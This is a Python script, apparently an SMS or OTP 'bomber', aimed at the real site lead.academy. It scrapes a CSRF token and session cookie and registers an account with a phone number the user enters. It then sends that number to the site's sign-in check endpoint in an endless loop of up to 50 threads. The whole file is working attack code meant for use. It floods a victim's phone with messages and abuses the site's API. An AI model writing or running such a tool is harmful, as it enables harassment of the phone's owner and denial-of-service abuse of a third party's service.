import requests
import random
import string
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Total requests counter
total_requests = 0

def get_csrf_token_and_session():
    """
    CSRF টোকেন এবং সেশন কুকি সংগ্রহ করা।
    """
    url = "https://lead.academy"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')

    csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']
    cookies = response.cookies
    session_cookie = cookies.get('leadacademy_session')

    if not csrf_token or not session_cookie:
        raise Exception("Failed to retrieve CSRF token or session cookie.")

    return csrf_token, session_cookie

def generate_random_email():
    """Generate a random email address."""
    domain = "gmail.com"
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{random_string}@{domain}"

def register_user(csrf_token, session_cookie, phone_number):
    """
    রেজিস্ট্রেশন রিকোয়েস্ট পাঠানো (শুধুমাত্র একবার)।
    """
    email = generate_random_email()
    url = 'https://lead.academy/signup-process'
    headers = {
        'Host': 'lead.academy',
        'X-CSRF-TOKEN': csrf_token,
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryT9mCju6SE7HSxm5k',
        'Cookie': f'leadacademy_session={session_cookie}'
    }

    data = f'''------WebKitFormBoundaryT9mCju6SE7HSxm5k
Content-Disposition: form-data; name="name"

Chowa
------WebKitFormBoundaryT9mCju6SE7HSxm5k
Content-Disposition: form-data; name="mobile"

{phone_number}
------WebKitFormBoundaryT9mCju6SE7HSxm5k
Content-Disposition: form-data; name="email"

{email}
------WebKitFormBoundaryT9mCju6SE7HSxm5k
Content-Disposition: form-data; name="password"

12345678
------WebKitFormBoundaryT9mCju6SE7HSxm5k
Content-Disposition: form-data; name="userType"

4
------WebKitFormBoundaryT9mCju6SE7HSxm5k--'''

    response = requests.post(url, headers=headers, data=data)
    if "success" in response.text.lower():
        print(f"Registration successful for email {email}")
    else:
        print(f"Registration failed for email {email}: {response.text}")

def sign_in_user(csrf_token, session_cookie, phone_number):
    """
    সাইন-ইন রিকোয়েস্ট পাঠানো।
    """
    global total_requests

    url = "https://lead.academy/signin-email-mobile-check"
    headers = {
        "Host": "lead.academy",
        "X-CSRF-TOKEN": csrf_token,
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"leadacademy_session={session_cookie}"
    }

    data = {
        "email": phone_number
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        total_requests += 1
        if response.status_code == 200:
            print(f"[api_10] [{total_requests}] Sign-in attempt successful: {response.text}")
        else:
            print(f"[api_10] [{total_requests}] Sign-in failed: {response.status_code}")
    except Exception as e:
        print(f"[api_10] Error in sign-in: {e}")

def main(mobile, threads):
    """
    মূল ফাংশন: রেজিস্ট্রেশন একবার এবং সাইন-ইন বারবার।
    """
    global total_requests
    
    if len(mobile) != 11 or not mobile.isdigit():
        print("Invalid phone number format. Please provide an 11-digit phone number.")
        return

    try:
        # CSRF টোকেন এবং সেশন সংগ্রহ
        csrf_token, session_cookie = get_csrf_token_and_session()
        print("CSRF token and session fetched successfully!")
    except Exception as e:
        print(e)
        return

    try:
        # একবার রেজিস্ট্রেশন করা
        register_user(csrf_token, session_cookie, mobile)
    except Exception as e:
        print(f"Registration error: {e}")
        return

    # মাল্টিথ্রেডিং দিয়ে সাইন-ইন রিকোয়েস্ট পাঠানো
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(sign_in_user, csrf_token, session_cookie, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

if __name__ == "__main__":
    mobile = input("Enter an 11-digit phone number: ")
    threads = int(input("Threads(1-50): "))
    main(mobile, threads)
